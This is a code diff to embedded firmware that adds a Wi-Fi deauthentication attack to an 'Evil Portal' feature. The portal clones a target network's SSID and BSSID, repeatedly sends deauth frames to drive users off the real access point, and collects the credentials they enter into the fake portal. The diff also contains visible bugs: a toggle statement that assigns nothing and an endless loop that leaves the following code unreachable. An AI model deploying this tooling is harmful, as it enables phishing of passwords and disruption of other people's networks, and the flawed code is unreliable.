@@ -3,6 +3,7 @@
 #include "mykeyboard.h"
 #include "wifi_common.h"
 #include "sd_functions.h"
+#include "wifi_atks.h"
 
 AsyncWebServer *ep;               // initialise webserver
 DNSServer dnsServer;
@@ -54,7 +55,7 @@ public:
   }
 };
 
-void startEvilPortal() {
+void startEvilPortal(String tssid, uint8_t* bssid, uint8_t channel, bool deauth) {
     bool redraw=true;
     Serial.begin(115200);
     // Definição da matriz "Options"
@@ -66,7 +67,14 @@ void startEvilPortal() {
     loopOptions(options);
     while(checkNextPress()){ yield(); } // debounce
 
-    AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
+    //  tssid="" means that are opening a virgin Evil Portal
+    if (tssid=="") AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
+    else { // tssid != "" means that is was cloned and can deploy Deauth
+      memcpy(ap_record.bssid, bssid, 6);
+      wsl_bypasser_send_raw_frame(&ap_record,channel);
+      AP_name = tssid;
+    }
+
     while(checkNextPress()){ yield(); } // debounce
 
     IPAddress AP_GATEWAY(172, 0, 0, 1);
@@ -117,8 +125,8 @@ void startEvilPortal() {
     drawMainMenu(0);
     menu_op.deleteSprite();
     menu_op.createSprite(WIDTH-20, HEIGHT-35);
-
-    while(!checkSelPress()) {
+    bool hold_deauth = false;
+    while(1) {
       if(totalCapturedCredentials!=previousTotalCapturedCredentials) {
         redraw=true;
         previousTotalCapturedCredentials = totalCapturedCredentials;
@@ -139,13 +147,31 @@ void startEvilPortal() {
         menu_op.setTextSize(FP);
         menu_op.println(last_cred);
 
+        if (hold_deauth) {
+          menu_op.setTextSize(FP);
+          menu_op.setTextColor(BGCOLOR);
+          menu_op.drawRightString("Deauth OFF", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+        } else {
+          menu_op.setTextSize(FP);
+          menu_op.setTextColor(TFT_RED);
+          menu_op.drawRightString("Deauth ON", menu_op.width(),menu_op.height()-8,SMOOTH_FONT);
+        }
+
         menu_op.pushSprite(8,26);
         redraw=false;
       }
+
+      if(!hold_deauth) wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
+
+      if(checkSelPress() && deauth) {
+        while(checkSelPress()) { yield(); } // timerless debounce
+        !hold_deauth;
+      }
+
       dnsServer.processNextRequest();
     }
 
-    while(checkSelPress()) { }
+    while(checkSelPress()) { yield(); } // timerless debounce
     displayWarning("Bruce will restart");
     while(!checkSelPress()) { }
     // Evil Portal uses a lot of RAM memmory, and can't open Menus after that, need to restart.
